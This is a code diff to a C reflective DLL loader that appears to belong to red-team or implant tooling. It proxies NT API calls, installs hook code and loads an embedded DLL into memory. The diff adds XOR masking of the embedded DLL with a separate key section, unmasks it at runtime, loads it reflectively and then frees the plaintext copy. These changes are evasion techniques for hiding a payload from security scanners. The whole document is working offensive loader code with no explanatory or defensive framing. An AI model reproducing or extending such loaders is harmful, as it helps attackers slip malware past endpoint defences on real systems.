@@ -70,6 +70,7 @@ typedef struct {
 char __DRAUGR__[0] __attribute__((section("draugr")));
 char __HOOKS__[0]  __attribute__((section("hooks")));
 char __DLL__[0]    __attribute__((section("dll")));
+char __KEY__[0]    __attribute__((section("key")));
 
 void * allocateVirtualMemory(SIZE_T size, ULONG protect)
 {
@@ -104,6 +105,22 @@ void protectVirtualMemory(void * baseAddress, SIZE_T size, ULONG newProtect)
     args.argument3   = (ULONG_PTR)(&size);
     args.argument4   = (ULONG_PTR)(newProtect);
     args.argument5   = (ULONG_PTR)(&oldProtect);
+
+    ProxyNtApi(&args);
+}
+
+void freeVirtualMemory(void * baseAddress)
+{
+    NTARGS args;
+    memset(&args, 0, sizeof(NTARGS));
+
+    SIZE_T size = 0;
+
+    args.functionPtr = (ULONG_PTR)(NTDLL$NtFreeVirtualMemory);
+    args.argument1   = (ULONG_PTR)(HANDLE)(-1);
+    args.argument2   = (ULONG_PTR)(&baseAddress);
+    args.argument3   = (ULONG_PTR)(&size);
+    args.argument4   = (ULONG_PTR)(MEM_RELEASE);
 
     ProxyNtApi(&args);
 }
@@ -161,11 +178,13 @@ void fixSectionPermissions(DLLDATA * dll, char * src, char * dst, MEMORY_REGION 
 
 void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderArgument)
 {
-    char    * hookSrc;
-    PICO    * hookDst;
-    char    * dllSrc;
-    DLLDATA   dllData;
-    char    * dllDst;
+    char     * hookSrc;
+    PICO     * hookDst;
+    RESOURCE * keyRes;
+    RESOURCE * dllRes;
+    DLLDATA    dllData;
+    char     * dllSrc;
+    char     * dllDst;
 
     /* Time to load the hook PICO */
     hookSrc = GETRESOURCE(__HOOKS__);
@@ -203,8 +222,18 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderA
     /* Call it to install the hooks */
     picoEntry((IMPORTFUNCS *)funcs, layout);
 
-    /* Now load the DLL */
-    dllSrc = GETRESOURCE(__DLL__);
+    /* Get XOR key */
+    keyRes = (RESOURCE *)GETRESOURCE(__KEY__);
+
+    /* Get XOR'd DLL */
+    dllRes = (RESOURCE *)GETRESOURCE(__DLL__);
+
+    /* Unmask and copy it into memory */
+    dllSrc = allocateVirtualMemory(dllRes->length, PAGE_READWRITE);
+
+    for (int i = 0; i < dllRes->length; i++) {
+        dllSrc[i] = dllRes->value[i] ^ keyRes->value[i % keyRes->length];
+    }
 
     /* Parse the headers */
     ParseDLL(dllSrc, &dllData);
@@ -227,6 +256,9 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderA
 
     /* Get its entry point */
     DLLMAIN_FUNC dllEntry = EntryPoint(&dllData, dllDst);
+
+    /* Free the unmasked copy */
+    freeVirtualMemory(dllSrc);
 
     /* Call it twice */
     dllEntry((HINSTANCE)dllDst, DLL_PROCESS_ATTACH, NULL);
